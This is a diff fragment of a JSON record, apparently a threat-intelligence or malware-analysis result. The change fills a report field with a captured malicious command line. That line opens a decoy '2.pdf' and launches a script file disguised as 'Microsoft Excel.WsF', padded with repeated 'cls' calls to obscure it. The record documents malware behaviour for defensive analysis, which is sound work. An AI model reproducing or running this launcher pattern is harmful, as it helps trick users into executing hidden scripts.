@@ -55,7 +55,7 @@
       },
       {
         "auto_collapse": false,
-        "body": null,
+        "body": "cmd.exe /c cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start 2.pdf&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start Microsoft\" \"Excel.WsF&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&exit",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
